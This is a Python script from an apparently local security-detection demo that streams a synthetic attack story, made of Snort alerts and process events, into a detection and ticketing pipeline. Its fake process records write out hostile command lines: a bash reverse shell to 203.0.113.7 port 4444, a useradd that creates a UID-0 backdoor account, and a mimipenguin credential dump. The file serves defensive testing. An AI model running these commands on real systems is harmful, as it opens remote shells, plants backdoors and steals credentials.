"""Streaming / live-capture simulation (LOCAL ONLY, fake data).

Simulates a live feed: a synthetic attack unfolds one event at a time, and after each
event the pipeline is recomputed so tickets appear progressively. Start the showcase app
(launch.py showcase), run this in another terminal, and refresh the UI to watch tickets
show up. The feed leans on Snort-style alerts, which are detected OS-independently, so the
demo produces tickets on both Linux and Windows.

This writes to out/showcase, the sealed demo sandbox, never to out/large. That isolation
is deliberate: a stream can never corrupt real local data.

Usage: stream.py [--interval SECONDS] [--out-dir DIR] [--loop]
"""
from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "src"))

from normalize.normalizer import normalize
from detect.engine import run_all
from correlate.correlator import correlate
from output.reporter import export
from soar.orchestrator import SoarOrchestrator
from output.html_report import generate_report


def _snort(ts, sid, msg, cls, pri, proto, src, sport, dst, dport):
    return {
        "source": "snort", "event_type": "network", "timestamp": ts,
        "host": dst, "signature": msg, "sid": sid, "classification": cls,
        "priority": pri, "protocol": proto,
        "src_ip": src, "src_port": sport, "dest_ip": dst, "dest_port": dport,
        "_label": msg,
    }


def _proc(ts, pid, ppid, name, path, cmd, host="stream-host-01", user="www-data"):
    return {
        "source": "csv", "event_type": "process", "timestamp": ts, "host": host,
        "pid": pid, "ppid": ppid, "process_name": name, "process_path": path,
        "command_line": cmd, "username": user, "_label": name,
    }


# A short attack story, chronological. Mix of network alerts and host process events.
FAKE_FEED = [
    _snort("2026-06-18T13:00:00+00:00", "1:2001219:20", "ET SCAN potential SSH scan",
           "Attempted Information Leak", 3, "TCP", "203.0.113.7", 40000, "192.168.1.20", 22),
    _snort("2026-06-18T13:00:30+00:00", "1:2010935:3", "ET EXPLOIT suspicious inbound payload",
           "Attempted Administrator Privilege Gain", 2, "TCP", "203.0.113.7", 40001, "192.168.1.20", 8080),
    _proc("2026-06-18T13:01:00+00:00", 9100, 9000, "sshd", "/usr/sbin/sshd", "/usr/sbin/sshd -D", user="root"),
    _proc("2026-06-18T13:01:05+00:00", 9200, 9100, "bash", "/bin/bash",
          "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"),
    _snort("2026-06-18T13:01:08+00:00", "1:2010937:3", "ET TROJAN reverse shell outbound",
           "A Network Trojan was Detected", 1, "TCP", "192.168.1.20", 51234, "203.0.113.7", 4444),
    _proc("2026-06-18T13:01:20+00:00", 9300, 9200, "useradd", "/usr/sbin/useradd",
          "useradd -o -u 0 backdoor", user="root"),
    _proc("2026-06-18T13:01:35+00:00", 9400, 9200, "python3", "/usr/bin/python3",
          "python3 mimipenguin.py"),
    _snort("2026-06-18T13:02:10+00:00", "1:2014726:4", "ET POLICY data exfiltration over HTTP",
           "Potential Corporate Privacy Violation", 2, "TCP", "192.168.1.20", 52000, "203.0.113.7", 80),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--interval", type=float, default=2.0)
    ap.add_argument("--out-dir", default=str(ROOT / "out" / "showcase"))
    ap.add_argument("--loop", action="store_true")
    args = ap.parse_args()

    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)
    from core import vault
    vault.configure(out)
    print(f"[stream] feeding {len(FAKE_FEED)} synthetic events to {out} every {args.interval}s")
    print("[stream] start the app with scripts/start and refresh the UI to watch tickets appear.")

    accumulated = []
    while True:
        accumulated.clear()
        for i, raw in enumerate(FAKE_FEED, start=1):
            accumulated.append(raw)
            events = [normalize(r) for r in accumulated]
            events.sort(key=lambda e: e.event_time_utc)
            signals = run_all(events)
            export(out, events, signals, correlate(signals))
            (out / "tickets.jsonl").unlink(missing_ok=True)
            soar = SoarOrchestrator(ticket_path=str(out / "tickets.jsonl"), min_score=0.30)
            tickets = soar.process(signals)
            try:
                generate_report(events, signals, tickets, str(out / "dashboard.html"))
            except Exception:
                pass
            print(f"[stream] tick {i}/{len(FAKE_FEED)} | +{raw.get('_label','event')} "
                  f"| events={len(events)} signals={len(signals)} tickets={len(tickets)}")
            time.sleep(args.interval)
        if not args.loop:
            break
    print("[stream] done. The showcase sandbox is populated; refresh the UI.")


if __name__ == "__main__":
    main()
